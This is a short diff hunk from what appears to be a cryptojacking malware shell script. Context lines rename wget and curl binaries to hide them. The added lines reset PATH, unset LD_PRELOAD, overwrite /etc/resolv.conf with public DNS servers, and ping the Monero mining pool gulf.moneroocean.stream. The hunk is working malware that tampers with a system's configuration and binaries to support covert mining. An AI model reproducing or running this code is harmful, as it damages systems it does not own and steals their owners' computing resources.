@@ -23,6 +23,13 @@ bbdira="/usr/bin/cd1"
 ccdir="/usr/bin/wget"
 ccdira="/usr/bin/wd1"
 
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+unset LD_LIBRARY_PATH
+unset LD_PRELOAD
+
+echo -e "nameserver 8.8.8.8\nameserver 1.1.1.1" > /etc/resolv.conf
+ping -c 3 gulf.moneroocean.stream
+
 mv /usr/bin/wgettnt /usr/bin/wd1
 mv /usr/bin/curltnt /usr/bin/cd1
 mv /usr/bin/wget1 /usr/bin/wd1
